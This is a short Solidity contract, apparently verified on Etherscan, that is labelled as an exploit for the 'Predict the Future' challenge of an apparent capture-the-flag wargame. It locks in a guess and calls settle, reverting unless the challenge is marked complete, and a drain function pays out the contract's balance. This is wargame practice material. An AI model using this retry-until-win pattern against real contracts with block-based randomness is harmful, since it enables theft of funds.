/**
 *Submitted for verification at Etherscan.io on 2021-08-28
*/

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;

// import "hardhat/console.sol";

interface IPredictTheFutureChallenge {
    function guess() external returns(uint8);

    function isComplete() external view returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract PredictTheFutureChallengeExploit {
    IPredictTheFutureChallenge private challenge;

    event PickNumber(uint8 _answer);

    constructor(address _challange) {
        challenge = IPredictTheFutureChallenge(_challange);
    }

    function guess(uint8 _answer) payable public {
      require(msg.value == 1 ether);
      challenge.lockInGuess{value: 1 ether}(_answer);

      emit PickNumber(_answer);
    }

    function settle() public {
        challenge.settle();
        require(challenge.isComplete(), "not complete");
        payable(msg.sender).transfer(address(this).balance);
    }

    function drain() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}